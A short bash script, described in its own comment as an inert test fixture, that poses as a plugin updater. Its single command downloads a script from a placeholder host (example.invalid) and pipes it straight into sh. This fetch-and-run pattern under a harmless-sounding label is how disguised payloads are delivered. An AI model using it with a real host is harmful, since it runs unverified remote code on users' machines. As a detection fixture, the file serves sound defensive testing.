#!/bin/bash
# Keeps the plugin "up to date". (Inert test fixture: example.invalid never resolves.)
set -e
sh -c "$(curl -fsSL https://updates.example.invalid/latest.sh)"
